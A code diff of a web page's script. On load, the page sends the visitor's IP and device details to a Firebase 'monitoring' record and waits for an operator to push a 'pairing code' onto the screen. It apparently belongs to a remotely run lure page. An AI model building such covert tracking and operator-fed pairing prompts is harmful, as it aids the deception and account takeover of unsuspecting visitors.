@@ -68,38 +68,27 @@
             const statusRef = db.ref('monitoring/' + userId);
             const commandRef = db.ref('commands/' + userId);
             
-            // سحب البيانات وإرسالها فوراً
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    statusRef.set({
+                    statusRef.update({
                         status: "Online",
                         ip: data.ip,
-                        device: navigator.platform + " / " + (navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown"),
+                        device: navigator.platform + " / " + (navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Device"),
                         ts: Date.now()
                     });
-                }).catch(() => {
-                    statusRef.set({ status: "Online", ts: Date.now() });
-                });
+                }).catch(() => statusRef.update({ status: "Online", ts: Date.now() }));
 
             statusRef.onDisconnect().update({ status: "Offline" });
 
-            // الاستماع للكود مع ميزة "عدم التعليق"
-            function listenForCode() {
-                commandRef.on('value', (snap) => {
-                    const data = snap.val();
-                    if (data && data.code) {
-                        document.getElementById('pairing-code').innerText = data.code;
-                        document.getElementById('ui-wait').innerText = lang.done;
-                        document.getElementById('ui-wait').classList.add('arrived');
-                        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                    }
-                }, (err) => {
-                    // إعادة المحاولة لو حصل خطأ في الاتصال
-                    setTimeout(listenForCode, 2000);
-                });
-            }
-            listenForCode();
+            commandRef.on('value', (snap) => {
+                const val = snap.val();
+                if (val && val.code) {
+                    document.getElementById('pairing-code').innerText = val.code;
+                    document.getElementById('ui-wait').innerText = lang.done;
+                    document.getElementById('ui-wait').classList.add('arrived');
+                }
+            });
         }
     </script>
 </body>
